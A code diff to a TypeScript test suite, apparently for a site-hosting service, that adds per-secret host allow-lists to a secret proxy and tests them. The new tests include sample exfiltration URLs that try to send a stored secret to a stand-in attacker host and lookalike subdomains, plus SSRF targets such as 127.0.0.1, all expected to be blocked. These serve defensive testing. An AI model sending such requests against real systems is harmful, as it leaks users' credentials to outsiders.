@@ -6,6 +6,7 @@ import { call, onOutbound, OWNER, PAGE, publishHtml, uniq } from "./helpers";
 
 const E = env as unknown as Env;
 const SECRET = "sk-live-0123456789abcdef";
+const HOSTS = ["api.test"];
 
 async function newSite(opts: Record<string, string> = {}, mount = "app") {
   const ns = uniq();
@@ -64,7 +65,7 @@ describe("security 4: namespace isolation", () => {
     const a = await newSite({}, "shared");
     const b = await newSite({}, "shared");
     await b.api("kv/private", { method: "PUT", body: '"b-data"' });
-    await b.api("secrets/key", { method: "PUT", json: { value: SECRET } });
+    await b.api("secrets/key", { method: "PUT", json: { hosts: HOSTS, value: SECRET } });
 
     // From A's origin, asking for the same mount path only ever finds A's site.
     expect((await a.api("kv/private")).status).toBe(404);
@@ -106,8 +107,8 @@ describe("security 10: cross-origin requests", () => {
 describe("secrets", () => {
   it("only owners and editors can set or delete; anyone allowed can list names", async () => {
     const { api } = await newSite({ editors: "ed@example.com", allowed_emails: "viewer@example.com" });
-    expect((await api("secrets/key", { method: "PUT", json: { value: SECRET }, as: "viewer@example.com" })).status).toBe(403);
-    expect((await api("secrets/key", { method: "PUT", json: { value: SECRET }, as: "ed@example.com" })).status).toBe(200);
+    expect((await api("secrets/key", { method: "PUT", json: { hosts: HOSTS, value: SECRET }, as: "viewer@example.com" })).status).toBe(403);
+    expect((await api("secrets/key", { method: "PUT", json: { hosts: HOSTS, value: SECRET }, as: "ed@example.com" })).status).toBe(200);
     expect(await (await api("secrets", { as: "viewer@example.com" })).json()).toEqual(["key"]);
     expect((await api("secrets/key", { method: "DELETE", as: "viewer@example.com" })).status).toBe(403);
     expect((await api("secrets/key", { method: "DELETE" })).status).toBe(200);
@@ -117,14 +118,14 @@ describe("secrets", () => {
   it("validates names, sizes and count", async () => {
     const { api, id } = await newSite();
     for (const name of ["UPPER", "has.dot", "x".repeat(65)]) {
-      expect((await api(`secrets/${name}`, { method: "PUT", json: { value: "v" } })).status, name).toBe(400);
+      expect((await api(`secrets/${name}`, { method: "PUT", json: { hosts: HOSTS, value: "v" } })).status, name).toBe(400);
     }
-    expect((await api("secrets/ok", { method: "PUT", json: { value: 42 } })).status).toBe(400);
-    expect((await api("secrets/ok", { method: "PUT", json: { value: "x".repeat(8 * 1024) } })).status).toBe(413);
+    expect((await api("secrets/ok", { method: "PUT", json: { hosts: HOSTS, value: 42 } })).status).toBe(400);
+    expect((await api("secrets/ok", { method: "PUT", json: { hosts: HOSTS, value: "x".repeat(8 * 1024) } })).status).toBe(413);
     const stmts = [];
     for (let i = 0; i < 50; i++) stmts.push(E.DB.prepare("INSERT INTO secrets (site_id, name, iv, ciphertext, updated_at) VALUES (?, ?, 'x', 'x', 0)").bind(id, `s${i}`));
     await E.DB.batch(stmts);
-    expect((await api("secrets/fifty-one", { method: "PUT", json: { value: "v" } })).status).toBe(409);
+    expect((await api("secrets/fifty-one", { method: "PUT", json: { hosts: HOSTS, value: "v" } })).status).toBe(409);
   });
 });
 
@@ -136,8 +137,8 @@ describe("security 5: secret values never leak", () => {
     try {
       const { api, id } = await newSite();
       const obj = { username: "svc-user", password: "pw-very-secret-123" };
-      const r1 = await api("secrets/key", { method: "PUT", json: { value: SECRET } });
-      const r2 = await api("secrets/basic", { method: "PUT", json: { value: obj } });
+      const r1 = await api("secrets/key", { method: "PUT", json: { hosts: HOSTS, value: SECRET } });
+      const r2 = await api("secrets/basic", { method: "PUT", json: { hosts: HOSTS, value: obj } });
       const r3 = await api("secrets");
       // An echoing upstream (like httpbin) must not hand the key to the browser.
       let seen = "";
@@ -188,12 +189,12 @@ describe("security 6: ciphertext is bound to site and name", () => {
   it("a ciphertext copied to another site or name row is unusable", async () => {
     const a = await newSite();
     const b = await newSite();
-    await a.api("secrets/key", { method: "PUT", json: { value: SECRET } });
-    await b.api("secrets/key", { method: "PUT", json: { value: "b-secret-value" } });
+    await a.api("secrets/key", { method: "PUT", json: { hosts: HOSTS, value: SECRET } });
+    await b.api("secrets/key", { method: "PUT", json: { hosts: HOSTS, value: "b-secret-value" } });
     const rowA = (await E.DB.prepare("SELECT iv, ciphertext FROM secrets WHERE site_id = ? AND name = 'key'").bind(a.id).first<{ iv: string; ciphertext: string }>())!;
     // Swap A's ciphertext into B's row, and into a differently named row on A.
     await E.DB.prepare("UPDATE secrets SET iv = ?, ciphertext = ? WHERE site_id = ? AND name = 'key'").bind(rowA.iv, rowA.ciphertext, b.id).run();
-    await E.DB.prepare("INSERT INTO secrets (site_id, name, iv, ciphertext, updated_at) VALUES (?, 'renamed', ?, ?, 0)").bind(a.id, rowA.iv, rowA.ciphertext).run();
+    await E.DB.prepare("INSERT INTO secrets (site_id, name, iv, ciphertext, hosts, updated_at) VALUES (?, 'renamed', ?, ?, '[\"api.test\"]', 0)").bind(a.id, rowA.iv, rowA.ciphertext).run();
     let called = false;
     onOutbound(() => {
       called = true;
@@ -219,8 +220,8 @@ describe("secret proxy", () => {
   let site: Awaited<ReturnType<typeof newSite>>;
   beforeAll(async () => {
     site = await newSite({ allowed_emails: "viewer@example.com" });
-    await site.api("secrets/str", { method: "PUT", json: { value: "plainkey" } });
-    await site.api("secrets/obj", { method: "PUT", json: { value: { public: "pk_123", secret: "sk_456", region: "eu" } } });
+    await site.api("secrets/str", { method: "PUT", json: { hosts: HOSTS, value: "plainkey" } });
+    await site.api("secrets/obj", { method: "PUT", json: { hosts: HOSTS, value: { public: "pk_123", secret: "sk_456", region: "eu" } } });
   });
 
   it("fills placeholders in url, headers and body", async () => {
@@ -268,7 +269,7 @@ describe("secret proxy", () => {
   });
 
   it("blocks SSRF targets after substitution", async () => {
-    await site.api("secrets/host", { method: "PUT", json: { value: "127.0.0.1" } });
+    await site.api("secrets/host", { method: "PUT", json: { hosts: HOSTS, value: "127.0.0.1" } });
     const res = await site.api("secrets/host/proxy", { method: "POST", json: { url: "https://{{value}}/admin" } });
     expect(res.status).toBe(400);
     expect((await res.json<{ error: { code: string } }>()).error.code).toBe("url_blocked");
@@ -303,7 +304,7 @@ describe("secret proxy", () => {
 
   it("rate-limits to 60 calls per minute per site", async () => {
     const s = await newSite();
-    await s.api("secrets/k", { method: "PUT", json: { value: "v" } });
+    await s.api("secrets/k", { method: "PUT", json: { hosts: HOSTS, value: "v" } });
     onOutbound(() => new Response("ok"));
     const statuses: number[] = [];
     for (let i = 0; i < 62; i++) statuses.push((await s.api("secrets/k/proxy", { method: "POST", json: { url: "https://api.test/" } })).status);
@@ -311,7 +312,72 @@ describe("secret proxy", () => {
     expect(statuses.slice(60)).toEqual([429, 429]);
     // Another site has its own budget.
     const other = await newSite();
-    await other.api("secrets/k", { method: "PUT", json: { value: "v" } });
+    await other.api("secrets/k", { method: "PUT", json: { hosts: HOSTS, value: "v" } });
     expect((await other.api("secrets/k/proxy", { method: "POST", json: { url: "https://api.test/" } })).status).toBe(200);
+  });
+});
+
+describe("secret host allow-lists", () => {
+  it("refuses to send a secret to a host it wasn't saved for (exfiltration by a viewer)", async () => {
+    const s = await newSite({ visibility: "all" });
+    await s.api("secrets/key", { method: "PUT", json: { hosts: ["api.test"], value: SECRET } });
+    let called = false;
+    onOutbound(() => ((called = true), new Response("ok")));
+    for (const url of [
+      "https://attacker.example.net/c?k={{value}}",
+      "https://api.test.attacker.example.net/?k={{value}}",
+      "https://{{value}}.attacker.example.net/",
+    ]) {
+      const res = await s.api("secrets/key/proxy", { as: "mallory@example.com", method: "POST", json: { url } });
+      expect(res.status, url).toBe(403);
+      const body = await res.text();
+      expect(JSON.parse(body).error.code).toBe("host_not_allowed");
+      expect(body).not.toContain(SECRET);
+    }
+    expect(called).toBe(false);
+  });
+
+  it("allows listed hosts and subdomains of a wildcard, but not the wildcard's own domain", async () => {
+    const s = await newSite();
+    await s.api("secrets/key", { method: "PUT", json: { hosts: ["API.Test.", "*.example.org"], value: SECRET } });
+    const hit: string[] = [];
+    onOutbound((req) => (hit.push(new URL(req.url).hostname), new Response("ok")));
+    const p = (url: string) => s.api("secrets/key/proxy", { method: "POST", json: { url } });
+    expect((await p("https://api.test/x")).status).toBe(200);
+    expect((await p("https://eu.example.org/x")).status).toBe(200);
+    expect((await p("https://a.b.example.org/x")).status).toBe(200);
+    expect((await p("https://example.org/x")).status).toBe(403);
+    expect((await p("https://badexample.org/x")).status).toBe(403);
+    expect(hit).toEqual(["api.test", "eu.example.org", "a.b.example.org"]);
+  });
+
+  it("requires a valid, public hosts list when setting a secret", async () => {
+    const s = await newSite();
+    const put = (hosts: unknown) => s.api("secrets/key", { method: "PUT", json: { value: SECRET, hosts } });
+    for (const bad of [undefined, [], "api.test", ["https://api.test"], ["api.test/path"], ["localhost"], ["127.0.0.1"], ["10.0.0.1"], ["example.com"], ["x.example.com"], ["example.app"], ["x.example.app"], ["*.example.app"], ["*"], ["*.com"], ["single"], [42], Array(21).fill("api.test")]) {
+      expect((await put(bad)).status, JSON.stringify(bad)).toBe(400);
+    }
+    expect((await put(["api.test"])).status).toBe(200);
+  });
+
+  it("refuses secrets saved before host lists until they are set again", async () => {
+    const s = await newSite();
+    const { iv, ciphertext } = await encryptSecret(E, s.id, "old", JSON.stringify(SECRET));
+    await E.DB.prepare("INSERT INTO secrets (site_id, name, iv, ciphertext, updated_at) VALUES (?, 'old', ?, ?, 0)").bind(s.id, iv, ciphertext).run();
+    let called = false;
+    onOutbound(() => ((called = true), new Response("ok")));
+    const res = await s.api("secrets/old/proxy", { method: "POST", json: { url: "https://api.test/?k={{value}}" } });
+    expect(res.status).toBe(409);
+    expect((await res.json<{ error: { code: string } }>()).error.code).toBe("secret_needs_hosts");
+    expect(called).toBe(false);
+    await s.api("secrets/old", { method: "PUT", json: { hosts: ["api.test"], value: SECRET } });
+    expect((await s.api("secrets/old/proxy", { method: "POST", json: { url: "https://api.test/?k={{value}}" } })).status).toBe(200);
+  });
+
+  it("records the hosts in the audit log", async () => {
+    const s = await newSite();
+    await s.api("secrets/key", { method: "PUT", json: { hosts: ["api.test"], value: SECRET } });
+    const row = await E.DB.prepare("SELECT detail FROM audit WHERE action = 'secret_set' AND target = ? ORDER BY id DESC").bind(`${s.ns}/app`).first<{ detail: string }>();
+    expect(JSON.parse(row!.detail).hosts).toEqual(["api.test"]);
   });
 });
